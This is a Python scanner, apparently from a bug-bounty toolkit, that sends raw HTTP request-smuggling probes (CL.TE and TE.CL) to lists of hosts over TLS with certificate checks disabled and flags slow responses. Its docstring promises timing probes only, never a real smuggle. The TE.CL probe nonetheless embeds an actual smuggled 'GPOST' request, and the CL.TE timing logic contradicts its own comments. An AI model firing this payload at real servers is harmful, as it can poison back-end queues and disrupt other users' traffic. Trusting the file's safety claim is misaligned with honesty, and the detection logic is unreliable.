#!/usr/bin/env python3
"""
patrol-http-smuggling — scanner #65.

Hunts HTTP Request Smuggling (CL.TE, TE.CL, TE.TE) vulnerabilities. Pattern:
front-end and back-end disagree on which length header to use → attacker can
"smuggle" a second request inside the first → bypass auth, poison cache, hijack
sessions.

Bounty range: $10K-$50K (severe — usually rated CRITICAL).

Method (ETHICAL — uses ONLY benign timing-based detection, never actual smuggle):
  1. Send a CL.TE-style request with conflicting Content-Length and
     Transfer-Encoding headers. The "smuggled" body has a small content-length
     but TE indicates 0 — back-end will wait for more data → timeout.
  2. Compare response time to a normal request. If CL.TE request takes
     5+s while normal takes <1s → desync likely.
  3. Same logic for TE.CL inverted.
  4. DO NOT actually smuggle an HTTP/1.1 request — only the timing probe.

NOTE: HTTP smuggling detection is FINICKY and prone to FPs. Treat outputs as
"manual verify candidate" not confirmed.

Usage:
  patrol-http-smuggling.py --hosts targets.txt --ledger http-smuggling.jsonl
"""
from __future__ import annotations
import argparse, json, socket, ssl, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from pathlib import Path

UA = "Lictor-SmugglingPatrol/0.1 (+https://lictor-ai.com)"

# CL.TE: Content-Length tells front-end the request is N bytes;
#         Transfer-Encoding: chunked tells back-end to read until 0-chunk.
# We send 5 bytes of body, CL=5, TE=chunked, body="0\r\n\r\n" (valid 0-chunk).
# If desync, back-end finishes; if not, it waits indefinitely.
CL_TE_PROBE = (
    b"POST / HTTP/1.1\r\n"
    b"Host: {host}\r\n"
    b"User-Agent: " + UA.encode() + b"\r\n"
    b"Content-Length: 5\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"0\r\n\r\n"
)

# TE.CL: TE says chunked (front-end reads chunks); CL says 5 bytes (back-end
# stops at byte 5). Same body but in CL view it's truncated mid-chunk-len.
TE_CL_PROBE = (
    b"POST / HTTP/1.1\r\n"
    b"Host: {host}\r\n"
    b"User-Agent: " + UA.encode() + b"\r\n"
    b"Content-Length: 4\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"5c\r\nGPOST / HTTP/1.1\r\nFoo: bar\r\n0\r\n\r\n"
)

# Baseline: normal POST
BASELINE = (
    b"POST / HTTP/1.1\r\n"
    b"Host: {host}\r\n"
    b"User-Agent: " + UA.encode() + b"\r\n"
    b"Content-Length: 0\r\n"
    b"\r\n"
)

@dataclass
class SmugglingFinding:
    host: str
    variant: str       # "CL.TE" / "TE.CL"
    baseline_time_ms: int
    probe_time_ms: int
    delta_ms: int
    classification: str  # "desync_candidate" / "normal" / "error"

def send_raw(host: str, payload: bytes, port: int = 443, timeout: int = 12) -> float | None:
    payload = payload.replace(b"{host}", host.encode())
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    t0 = time.time()
    try:
        with socket.create_connection((host, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=host) as s:
                s.settimeout(timeout)
                s.sendall(payload)
                # Read up to 4KB or until timeout
                data = b""
                try:
                    while len(data) < 4096:
                        chunk = s.recv(4096)
                        if not chunk: break
                        data += chunk
                        if b"\r\n\r\n" in data: break
                except socket.timeout:
                    return time.time() - t0
                return time.time() - t0
    except Exception:
        return None

def check_host(host: str) -> list[SmugglingFinding]:
    baseline = send_raw(host, BASELINE)
    if baseline is None: return []
    baseline_ms = int(baseline * 1000)

    out = []
    for variant_name, probe in [("CL.TE", CL_TE_PROBE), ("TE.CL", TE_CL_PROBE)]:
        t = send_raw(host, probe)
        if t is None: continue
        ms = int(t * 1000)
        delta = ms - baseline_ms
        cls = "desync_candidate" if delta > 5000 else "normal"
        if cls == "desync_candidate":
            out.append(SmugglingFinding(host=host, variant=variant_name,
                                         baseline_time_ms=baseline_ms,
                                         probe_time_ms=ms, delta_ms=delta,
                                         classification=cls))
    return out

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--hosts", required=True)
    ap.add_argument("--threads", type=int, default=6)
    ap.add_argument("--ledger", default="/Users/raffa/Lictor/v3/ledgers/http-smuggling.jsonl")
    args = ap.parse_args()

    hosts = [h.strip() for h in Path(args.hosts).read_text().splitlines() if h.strip()]
    print(f"[+] HTTP-smuggling hunt across {len(hosts)} hosts")
    print(f"[+] WARNING: timing-based detection is finicky — high FP rate. Verify manually.")
    Path(args.ledger).parent.mkdir(parents=True, exist_ok=True)
    n = 0
    with open(args.ledger, "a") as ledger, \
         ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(check_host, h): h for h in hosts}
        for i, fut in enumerate(as_completed(futures), 1):
            host = futures[fut]
            try: hits = fut.result()
            except Exception: continue
            for f in hits:
                ledger.write(json.dumps(asdict(f)) + "\n")
                ledger.flush()
                n += 1
                print(f"  [{i}/{len(hosts)}] 🟡 {host}  {f.variant}  delta={f.delta_ms}ms (baseline={f.baseline_time_ms}ms)")
            if i % 30 == 0: print(f"  [{i}/{len(hosts)}] scanning... {n} desync candidates so far")
    print(f"\n[+] Done. {n} HTTP-smuggling candidates → {args.ledger}")

if __name__ == "__main__":
    main()
